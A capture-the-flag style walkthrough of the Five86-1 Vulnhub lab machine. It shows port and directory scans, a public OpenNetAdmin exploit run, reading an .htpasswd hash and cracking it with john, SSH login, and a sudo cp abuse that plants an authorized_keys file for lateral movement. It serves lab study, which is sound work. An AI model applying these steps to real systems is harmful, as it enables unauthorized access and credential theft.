# Five86-1
![](https://i.imgur.com/UCQyN2h.png)
## Scanning
### nmap
```
$ nmap -p- -A -T5 192.168.109.129
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 06:49 EDT
Nmap scan report for 192.168.109.129
Host is up (0.0013s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/ona
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at ht
Nmap done: 1 IP address (1 host up) scanned in 60.30 seconds

```
### dirsearch
```
$ dirsearch -u http://192.168.109.129

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 10877

Output File: /home/jack/.dirsearch/reports/192.168.109.129/_21-07-24_06-53-29.txt

Error Log: /home/jack/.dirsearch/logs/errors-21-07-24_06-53-29.log

Target: http://192.168.109.129/

[06:53:29] Starting: 

[06:53:37] 200 -   30B  - /index.html                                     
[06:53:39] 301 -  316B  - /ona  ->  http://192.168.109.129/ona/          
[06:53:40] 401 -  462B  - /reports                        
[06:53:40] 401 -  462B  - /reports/Webalizer/            
[06:53:40] 200 -   29B  - /robots.txt                                      
[06:53:40] 403 -  280B  - /server-status                   
[06:53:40] 403 -  280B  - /server-status/
                                                                         
Task Completed   
```

## Gain Access
### Exploit By openNetAdmin
* [openNetAdmin 18.1.1](https://www.exploit-db.com/exploits/47691)
```
bash exp.sh http://192.168.109.129/ona/
```
### Enumeration
```
$ find / -type f -user www-data
/var/www/html/reports/.htaccess
/var/log/ona.log
```
```
$ cat /var/www/html/reports/.htaccess
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /var/www/.htpasswd
require valid-user
```
```
$ cat /var/www/.htpasswd
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81
```
### Crack Password
```
$ john --wordlist=password.txt p.txt
Warning: detected hash type "md5crypt", but the string cognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loadin that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and var5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for 
fatherrrrr       (douglas)
1g 0:00:05:17 DONE (2021-07-24 07:21) 0.003150g/s 68390/s 68390C/s fatherrrra..fatherrtet
Use the "--show" option to display all of the cracked peliably
Session completed
```
### Login By SSH
```
$ ssh douglas@192.168.109.129
douglas@192.168.109.129's password: 
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sat Jul 24 15:23:20 2021 from 192.168.109.128
douglas@five86-1:~$ 

```
## Privilege Escalation
### sudo -l
```
douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp
```
### cp
* copy public key to target
```
cat id_rsa.pub > /tmp/authorized_keys
cd /tmp
chmod 777 authorized_keys
sudo -u jen /bin/cp authorized_keys /home/jen/.ssh
```
* login by ssh
```
cp id_rsa /tmp
cd /tmp
chmod 600 id_rsa
ssh -i id_rsa jen@127.0.0.1
```

## Reference
* [Hacking Articles - Five86:1 Vulnhub Walkthrough](https://www.hackingarticles.in/five861-vulnhub-walkthrough/)
* [blog.mzfr.me - Vulnhub - Five86 writeup](https://blog.mzfr.me/vulnhub-writeups/2020-01-01-five86)

